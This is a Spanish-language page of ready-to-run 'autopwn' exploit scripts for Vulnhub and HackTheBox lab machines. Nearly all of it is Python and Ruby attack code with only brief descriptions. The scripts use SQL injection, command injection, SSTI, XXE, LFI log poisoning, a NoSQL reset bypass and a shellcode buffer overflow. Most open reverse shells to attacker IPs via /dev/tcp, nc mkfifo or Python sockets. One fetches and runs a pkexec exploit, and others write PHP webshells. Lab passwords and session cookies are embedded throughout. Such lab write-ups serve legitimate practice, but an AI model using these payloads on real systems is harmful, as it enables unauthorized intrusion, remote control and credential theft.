---
layout: content
---
<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Five86 - Vulnhub</h2>
<p> </p>

Este código aprovecha una versión desactualizada de **OpenNetAdmin** para enviar una petición maliciosa al servidor codificando una *reverse shell* en Base64 y ganando acceso mediante una consola interactiva.

* Consola interactiva
* OpenNetAdmin
* Testeo de servidor

```python
#!/usr/bin/python3 

from pwn import *
import requests
from signal import signal
from dataclasses import dataclass 
from sys import exit
from base64 import b64encode

def def_handler(sig,frame):
    print('Saliendo...')
    exit(1)

signal(signal.SIGINT, def_handler)

# burp = {'http':'http://127.0.0.1:8080'} Proxy para analizar petición

@dataclass # Uso de decorador para ahorrar código
class Exploit:
    url: str
    cmd: str

    def base64encode(self): # Función para codificar shell inverso en base64
        global cmd_encoded
        cmd_encoded = b64encode(self.cmd.encode('utf-8')).decode('utf-8')
    
    def send_request_rce(self): # Función para enviar petición al servidor
	p1 = log.progress(f'Status Code [{self.url}]')
        try: # Manejo verificación de estado, esperado: 200 OK
            r = requests.get(self.url, timeout=15)
            if r.status_code == 200:
                p1.success(str(r.status_code))
                
                p2 = log.progress('Request')

                data_post = {
                    'xajax': 'window_submit',
                    'xajaxr': '1574117726710',
                    'xajaxargs[]': ['tooltips', 'ip=>;echo "BEGIN";echo ' + cmd_encoded + ' | base64 -d | bash;echo "END"', 'ping']
                }               

                try: # Manejo de excepciones para la petición
                    r = requests.post(self.url, data=data_post)
                    r.raise_for_status() 
                except requests.exceptions.RequestException as e:
                    p2.failure(e)
                except KeyboardInterrupt:
                    p2.failure('Cancelado...')

            else:
                p1.failure(str(r.status_code))
        except requests.exceptions.Timeout:
            p1.failure('Timeout')
        except requests.exceptions.RequestException as e:
            p1.failure(str(e))


autopwn = Exploit("http://[IP Servidor]/ona/", "sh -i >& /dev/tcp/[Vuestra IP]/443 0>&1")
                          # ↑ Cambiar IP (Victim)                   ↑ Cambiar IP (Host)
def main():
    autopwn.base64encode()
    autopwn.send_request_rce()

if __name__ == '__main__':
    try:
        threading.Thread(target=main, args=()).start()
    except Exception as e:
        log.error(str(e))

shell = listen(443, timeout=60).wait_for_connection()
shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Catch - HackTheBox</h2>

Este *Script* abusa del CVE-2021-39174 para filtrar los valores de entrada de configuracion: nombres de usuario: `${DB_USERNAME}` y contraseña: `${DB_PASSWORD}` del archivo `.env` a través de un *input*.

* Misconfiguration

```python
#!/usr/bin/python3

from pwn import *
from requests import get, post, Session
import signal 
from sys import exit
from re import findall
from bs4 import BeautifulSoup
from pexpect import pxssh 

# User: john
# Password: E}V!mywu_69T4C}W

def def_handler(sig,frame):
    print('\nSaliendo...\n')
    exit(1)

signal.signal(signal.SIGINT, def_handler)

burp = {'http':'http://127.0.0.1:8080'}

s = Session()

class Exploit():
    def __init__(self, url, user, password, env_username, env_password):
        self.__url = url
        self.__user = user
        self.__password = password
        self.__env_user = env_username
        self.__env_pass = env_password
        
    def login(self):
        p1 = log.progress('Login')

        global csrf_token
        r = s.get(self.__url+'/auth/login')
        csrf_token = findall(r'<meta name="token" content="(.*?)">', r.text)[0]
        
        post_data = {
            '_token': csrf_token,
            'username': self.__user,
            'password': self.__password,
            'remember_me': 0
        }

        try:
            r = s.post(self.__url+'/auth/login', data=post_data, timeout=20)
            p1.success('✔')
        except Exception as e:
            p1.failure('✘')
            exit(1)

    def read_env(self):
        p2 = log.progress('User')
        p3 = log.progress('Password')

        post_data = {
            '_token': (None, csrf_token),
            'config[mail_driver]': (None, ''),
            'config[mail_host]': (None, ''),
            'config[mail_address]': (None, self.__env_user+':'+self.__env_pass),
            'config[mail_username]': (None, ''),
            'config[mail_password]': (None, '')
        }

        try:
            r = s.post(self.__url+'/dashboard/settings/mail', files=post_data)
            sleep(2)  
            r = s.get(self.__url+'/dashboard/settings/mail')
            
            soup = BeautifulSoup(r.text, "html.parser")
            payload_response = soup.find("input", {"placeholder": "notifications@alt-three.com"})["value"]
            
            p2.success(payload_response[0:4])
            p3.success(payload_response[5:16])

        except Exception as e:
            p2.failure('✘')
            p3.failure('✘')
            exit(1)

autopwn = Exploit('http://catch.htb:8000', 'john', 'E}V!mywu_69T4C}W', '${DB_USERNAME}', '${DB_PASSWORD}')

def main():
    autopwn.login()
    autopwn.read_env()

if __name__ == '__main__':
    main()
```

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Altered - HackTheBox</h2>

Este *Script* abusa de una Inyección SQL para posteriormente subir un Shell inverso haciendo uso de la utilidad `into outfile` enviando datos JSON.

* Acceso como `www-data`
* Shell inverso

```python
#!/usr/bin/python3

from pwn import *
from sys import exit
from requests import get
import signal

def def_handler(sig,frame):
	print("Saliendo...")
	exit(1)
signal.signal(signal.SIGINT, def_handler)

class Exploit():
	def __init__(self, main_url):
		self.__url = main_url

	def upload_file(self):

		headers = {
			'Content-Type': 'application/json',
			'Cookie': 'XSRFTOKEN=eyJpdiI6IlFXVmNMS2dSdUpUcGRDZTFLRXBjK0E9PSIsInZhbHVlIjoiUHBXbko3OWpGdzdyOWFlWVJSclJnbzgrZlFxR0FhS1NWaDR5WmdudDBDMTBlRi91bVhIYkE1YzJXWTh5VmczUlRSTVR6dHRuUlpUa1JaN3ZJMjgwQ3pUd21uNnJadEFYS3oxYm5rQVZqdFVFRjc2c3JoRitxT3d0Y2p4TGVLSkUiLCJtYWMiOiJiYTdjZjJiZmViN2Q4NmE0OWJmMjIwNTA2Zjg4YjVmNDY3ZjMyMTNlOTUwN2U1N2NiYmVmZWZkOWNmZmZhMzY1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkdmM2RkeGlEVHBHano2RkRjTDZOUmc9PSIsInZhbHVlIjoiNlk5b2NnK2cvbGFFOG80RWpQcEFQckRrbU9kbjhWckREM2RRcjFwakR3VzNXeHk5dHc4UTFFbU0wZ0tRaGptL3JUeEpSUEZtZEJncXJObWRrQnBNTjE3dnRZaHgwbDI2YlNNL1c4RzB4SVpGNHZ0eWpjNjdRNncwWUJ0QnlvQnYiLCJtYWMiOiI3YjBmNjZjNzk0MjNhMDk2NjY5ZDBlMzIyYzJiOTNiMTg4NDA4ZWU2MjFjOTI1OWM5MGMwYzQ3Njk5ZWUzY2Y5IiwidGFnIjoiIn0%3D',
			'X-Requested-With': 'XMLHttpRequest'
		}

		# Cambiar IP por la vuestra
		data_json = {
			"id": "0 union select 1,2, '<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 443 >/tmp/f\"); ?>' into outfile '/srv/altered/public/shell.php';-- -",
		"secret": True
		}

		r = get(self.__url+'/api/getprofile', json=data_json, headers=headers)
		m = get(self.__url+'/shell.php')

autopwn = Exploit('http://10.10.11.159')

def main():
	autopwn.upload_file()

if __name__ == '__main__':
	try:
		threading.Thread(target=main, args=()).start()
	except Exception as e:
		log.error(str(e))

shell = listen(443, timeout=20).wait_for_connection()
shell.interactive()
```

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Devzat - HackTheBox</h2>

Este *Script* aprovecha la mala desinfección del código de lado del servidor para concatenar comandos y ganar **ejecución remota de código** enviando una petición POST con datos JSON.

* Acceso como `patrick`
* Shell inverso por `nc`

```ruby
#!/usr/bin/env ruby

require 'httparty'

trap "SIGINT" do
	puts "Saliendo..."
	exit 130
end

class Exploit

	def initialize(main_url)
		@main_url = main_url
	end

	def rce_json
		# Cambiar IP por la vuestra
		params = {'name' => 'test', 'species' => '; bash -c "exec bash -i &>/dev/tcp/10.10.16.53/443 <&1"'}
		res = HTTParty.post(@main_url+'/api/pet', {
			body: params.to_json,
			headers: {'Content-type' => 'application/json'}
		}) 
	end 
end

autopwn = Exploit.new('http://pets.devzat.htb')

if __FILE__ == $0
	autopwn.rce_json
end
```

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Hancliffe - HackTheBox</h2>

Este *Script* aprovecha la mala desinfección del código de un programa para inyectar *shellcode* y ganar un Shell inverso abusando de la reutilización de *sockets* por un límite de *buffer* definido muy pequeño.

* Acceso como `Administrator`
* Shell inverso por `nc`

```python
#!/usr/bin/python3

from pwn import *
from sys import argv
from time import sleep

class Exploit():

	def __init__(self, user, password, name):
		self.__user = user
		self.__password = password
		self.__name = name

	def socket_reuse(self):
	
		"""
		int recv(
  			[in]  SOCKET s, 0x
  			[out] char   *buf, -> 0x00be40f0
  			[in]  int    len, ->  0x00000410 
  			[in]  int    flags -> 0x00000000
		);
		"""
		
		# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.53 lport=443 EXITFUNC=thread -b '\x00' -f python
		# Cambiar a vuestro shellcode
		buf =  b""
    		buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x0c\x84\x35\xbe\x5a\x33"
    		buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x4e\x97\xd7"
    		buf += b"\x4b\xb2\x7f\x95\xb4\x4a\x80\xfa\x3d\xaf\xb1\x3a\x59"
    		buf += b"\xa4\xe2\x8a\x29\xe8\x0e\x60\x7f\x18\x84\x04\xa8\x2f"
    		buf += b"\x2d\xa2\x8e\x1e\xae\x9f\xf3\x01\x2c\xe2\x27\xe1\x0d"
    		buf += b"\x2d\x3a\xe0\x4a\x50\xb7\xb0\x03\x1e\x6a\x24\x27\x6a"
    		buf += b"\xb7\xcf\x7b\x7a\xbf\x2c\xcb\x7d\xee\xe3\x47\x24\x30"
    		buf += b"\x02\x8b\x5c\x79\x1c\xc8\x59\x33\x97\x3a\x15\xc2\x71"
    		buf += b"\x73\xd6\x69\xbc\xbb\x25\x73\xf9\x7c\xd6\x06\xf3\x7e"
    		buf += b"\x6b\x11\xc0\xfd\xb7\x94\xd2\xa6\x3c\x0e\x3e\x56\x90"
    		buf += b"\xc9\xb5\x54\x5d\x9d\x91\x78\x60\x72\xaa\x85\xe9\x75"
    		buf += b"\x7c\x0c\xa9\x51\x58\x54\x69\xfb\xf9\x30\xdc\x04\x19"
    		buf += b"\x9b\x81\xa0\x52\x36\xd5\xd8\x39\x5f\x1a\xd1\xc1\x9f"
    		buf += b"\x34\x62\xb2\xad\x9b\xd8\x5c\x9e\x54\xc7\x9b\xe1\x4e"
    		buf += b"\xbf\x33\x1c\x71\xc0\x1a\xdb\x25\x90\x34\xca\x45\x7b"
    		buf += b"\xc4\xf3\x93\x2c\x94\x5b\x4c\x8d\x44\x1c\x3c\x65\x8e"
    		buf += b"\x93\x63\x95\xb1\x79\x0c\x3c\x48\xea\x39\xcb\x42\xdf"
    		buf += b"\x55\xc9\x62\x1e\x1d\x44\x84\x4a\x71\x01\x1f\xe3\xe8"
   		buf += b"\x08\xeb\x92\xf5\x86\x96\x95\x7e\x25\x67\x5b\x77\x40"
    		buf += b"\x7b\x0c\x77\x1f\x21\x9b\x88\xb5\x4d\x47\x1a\x52\x8d"
    		buf += b"\x0e\x07\xcd\xda\x47\xf9\x04\x8e\x75\xa0\xbe\xac\x87"
    		buf += b"\x34\xf8\x74\x5c\x85\x07\x75\x11\xb1\x23\x65\xef\x3a"
    		buf += b"\x68\xd1\xbf\x6c\x26\x8f\x79\xc7\x88\x79\xd0\xb4\x42"
  		buf += b"\xed\xa5\xf6\x54\x6b\xaa\xd2\x22\x93\x1b\x8b\x72\xac"
   		buf += b"\x94\x5b\x73\xd5\xc8\xfb\x7c\x0c\x49\x1b\x9f\x84\xa4"
    		buf += b"\xb4\x06\x4d\x05\xd9\xb8\xb8\x4a\xe4\x3a\x48\x33\x13"
    		buf += b"\x22\x39\x36\x5f\xe4\xd2\x4a\xf0\x81\xd4\xf9\xf1\x83"

		recv = b""
		recv += b"\x54" 				# -> push esp
		recv += b"\x58" 				# -> pop eax
		recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
		recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
		recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
		recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
		recv += b"\x31\xdb" 				# -> xor ebx, ebx
		recv += b"\x53" 				# -> push ebx 
		recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
		recv += b"\x53" 				# -> push ebx
		recv += b"\x54"					# -> push esp
		recv += b"\x5b"					# -> pop ebx
		recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
		recv += b"\x53"					# -> push ebx
		recv += b"\x56" 				# -> push esi
		recv += b"\xa1\xac\x82\x90\x71"			# -> mov eax, [0x719082ac]
		recv += b"\xff\xd0"				# -> call eax
    
		payload = recv + b"\x90"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70

		r = remote("10.10.11.115", argv[1])

		r.sendlineafter(b"Username: ",self.__user)
		r.sendlineafter(b"Password: ",self.__password)
		r.sendlineafter(b"FullName:",self.__name)	
		r.sendlineafter(b"Input Your Code:",payload)
		sleep(1)
		r.sendline(buf)

autopwn = Exploit(b'alfiansyah', b'K3r4j@@nM4j@pAh!T', 'Vickry Alfiansyah')

def main():
	autopwn.socket_reuse()

if __name__ == '__main__':
	main()
``` 


<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">GoodGames - HackTheBox</h2>

Este *Script* explota una inyección `SQL` para volcar un hash `MD5`, también se aprovecha de un `Server Side Template Injection` para derivar a la ejecución de código arbitrario mediante sentencias maliciosas de `Jinja2`.

* Acceso como `root` en `contenedor`
* Shell interactivo

```python
#!/usr/bin/python3

from pwn import *
from re import findall
import signal
from sys import exit
from requests import get,post,session

def def_handler(sig,frame):
	print("Saliendo")
	exit(1)
signal.signal(signal.SIGINT, def_handler)

class Exploit():
	def __init__(self, main_url, subdomain, password):
		self.__url = main_url
		self.__subdomain = subdomain
		self.__pass = password
	
	def extract_hash(self):

		data_sqli = {
			'email': """' union select 1,2,3,password from main.user-- -""",
			'password': 'guest'
		}
		p1 = log.progress("Hash")

		r = post(self.__url+'/login', data=data_sqli)
		hash_MD5 = findall(r'<h2 class="h4">Welcome (.*?)</h2>', r.text)[0]
		
		p1.success(hash_MD5[0:32])

	def rce_ssti(self):

		s = session()
		s.verify = False 

		r = get(self.__subdomain+'/login')
		csrf_token = findall(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', r.text)[0]

		data_login = {
			'csrf_token': csrf_token,
			'username': 'admin',
			'password': 'superadministrator',
			'login': ''
		}

		r = s.post(self.__subdomain+'/login', data=data_login)
		# Cambiar IP por la vuestra
		# Juntar llaves de SSTI de principio y fin
		data_ssti = {
			'name': r'''{ { cycler.__init__.__globals__.os.popen("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.78\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""").read() } }'''
		}

		r = s.post(self.__subdomain+'/settings', data=data_ssti)

autopwn = Exploit('http://goodgames.htb', 'http://internal-administration.goodgames.htb', 'superadministrator')

def main():
	autopwn.extract_hash()
	autopwn.rce_ssti()

if __name__ == '__main__':
	try:
		threading.Thread(target=main, args=()).start()
	except Exception as e:
		log.error(str(e))

shell = listen(443, timeout=20).wait_for_connection()
shell.interactive()
``` 

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Horizontall - HackTheBox</h2>

Este *Script* explota un campo de reseteo de contraseña mal configurado para acceder como usuario admin y subir un *plugin* malicioso ganando un Shell inverso por `nc`, también se aprovecha del permiso `SUID` `pkexec` para escalar privilegios.

* Acceso como `root`
* Shell interactivo

```python
#!/usr/bin/python3
#coding: utf-8

# Uso: python3 -m http.server <- Ejecutar en la misma carpeta que el autopwn

from pwn import *
import sys
import requests
import signal
import urllib3
import json
import zipfile 
import shutil
import git

def def_handler(sig,frame):
	print("Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

class Exploit:

	def __init__(self, main_url, password, filename):
		self.__url = main_url
		self.__password = password
		self.__filename = filename

	def zip_file(self):
		os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
		git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
		cwd = os.getcwd()
		shutil.make_archive(self.__filename, 'zip', cwd+'/'+self.__filename)

	def reset_password(self):
		s = requests.session()
		s.verify = False
		urllib3.disable_warnings()

		p1 = log.progress('Password')

		data_password = {
			'code': {'$gt':0},
			'password': self.__password,
			'passwordConfirmation': self.__password
		}

		r = s.post(self.__url+'/admin/auth/reset-password', json=data_password).text

		response = json.loads(r)
		global jwt

		jwt = response['jwt']

		if 'jwt' not in r:
			p1.failure('Not changed password')
			sys.exit(1)
		else:
			p1.success(f'[Changed password] username admin and password {self.__password}')

	def rce_starpi(self):
		header = { 'Authorization': f'Bearer {jwt}' }
		
		# Cambiar IP por la vuestra
		data_plugin = {
			'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.78 443 >/tmp/f)',
			'port': '1337'
		}

		r = requests.post(self.__url+'/admin/plugins/install', json=data_plugin, headers=header)
		
autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')

def main():
	autopwn.zip_file()
	autopwn.reset_password()
	autopwn.rce_starpi()
	
if __name__ == '__main__':
	try:
		threading.Thread(target=main, args=()).start()
	except Exception as e:
		log.error(str(e))

shell = listen(443, timeout=20).wait_for_connection()
# Cambiar IP por la vuestra
shell.sendline('cd /tmp; wget http://10.10.16.78:8000/CVE-2021-4034.zip > /dev/null 2>&1; unzip -q CVE-2021-4034.zip; make 2>/dev/null; ./cve-2021-4034')
shell.interactive()
```

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Writer - HackTheBox</h2>

Este *Script* abusa de una mala sanitizacion en cuanto a código en `Flask` y permite ganar **ejecución remota de comandos** a través de la concatenación de código malicioso en el nombre de una imagen con extensión `.jpg`.

* Acceso como `www-data`
* Shell interactivo

```python
#!/usr/bin/python3

import signal
from pwn import *
import requests
import urllib3
import base64
import os

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales

login_url = "http://writer.htb/administrative"
add_post = "http://writer.htb/dashboard/stories/add"
bypass_sqli = "username: ' or 1 -- //"
#burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def main():
    # Cambiar IP por la vuestra
    payload_malicious = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.75/443 0>&1'"
    payload_malicious_bytes = payload_malicious.encode('ascii')
    base64_bytes = base64.b64encode(payload_malicious_bytes)
    base64_payload_malicious = base64_bytes.decode('ascii')

    os.system(f"""touch "reverse_shell.jpg; \`echo {base64_payload_malicious} | base64 -d | bash\`;" """)

    s = requests.session()
    s.verify = False
    urllib3.disable_warnings()

    p1 = log.progress("Login")

    data_post = {
        'uname': bypass_sqli,
        'password': bypass_sqli
    }

    r = s.post(login_url, data=data_post, allow_redirects=True)

    p1.status("Success [✔]")
    p2 = log.progress("Malicious image")

    image = open(f"reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;", "rb")

    file_image = {
        "author": (None, ''),
        "title": (None, ''),
        "tagline": (None, ''),
        "image": image,
        "image_url": (None, f'file:///var/www/writer.htb/writer/static/img/reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;'),
        "content": (None, '')
    }

    r = s.post(add_post, files=file_image)
    
    p2.success("Injected payload [✔]")
    
if __name__ == '__main__':

    try:
        threading.Thread(target=main, args=()).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Pikaboo - HackTheBox</h2>

Este *Script* se aprovecha de un `Local File Inclusion` para derivarlo al envenenado de logs de `FTP` y por ello ganar un Shell inverso inyectando código malicioso en los campos `user` y `password` en la autenticación.

* Acceso como `www-data`
* Shell interactivo

```python
#!/usr/bin/python3

from pwn import *
import requests
from ftplib import FTP
import ftplib

# Variables globales

main_url = "http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log"
# Cambiar IP por la vuestra
payload = """<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"'); ?>"""
lport = 443

def def_handler(sig,frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def main():
    p1 = log.progress("Payload")
    p1.status("Inyectando [*]")

    try:
        ftp = FTP("10.10.10.249")
        ftp.login(payload,payload)
    except ftplib.error_perm as error:
        p1.success("Inyectado [✔]")

    r = requests.get(main_url)

if __name__ == '__main__':

    try:
        threading.Thread(target=main, args=()).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">BountyHunter - HackTheBox</h2>

Este *Script* explota un `XML enternal entity` codificado en `base64` para poder visualizar `db.php`, este archivo contiene credenciales en texto plano, estas sirven para acceder por `SSH` haciendo uso del usuario `development`.

* Acceso como `development`
* Shell interactivo

```python
#!/usr/bin/python3
#coding: utf-8

from pwn import *
import requests
import base64
import re
from pexpect import pxssh
import html

# Variables globales
main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
#burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def main():
    username = "development"
    password = ""
    #Coficacion en base64
    xxe_payload = """<?xml  version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]> <bugreport> <title>&test;</title> <cwe>test</cwe> <cvss>test</cvss> <reward>test</reward> </bugreport>"""
    xxe_payload_bytes = xxe_payload.encode('ascii')
    base64_bytes = base64.b64encode(xxe_payload_bytes)
    base64_xxe_payload = base64_bytes.decode('ascii')

    data_post = {
        'data': base64_xxe_payload
    }

    r = requests.post(main_url, data=data_post)
    db_file = html.unescape(re.findall(r'<td>(.*?)</td>', r.text, re.DOTALL)[1]).strip()

    #Decodificacion de archivo db.php en base64
    base64_bytes = db_file.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')

    password = re.findall(r'dbpassword = "(.*?)";', message)[0]

    return password

def sshconnection(username, password):
    s = pxssh.pxssh()
    s.login('10.10.11.100', username, password)
    # Cambiar IP por la vuestra
    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f")
    s.prompt()
    s.logout()

if __name__ == '__main__':

    password = main()
    username = main()

    try:
        threading.Thread(target=sshconnection, args=('development', password)).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```
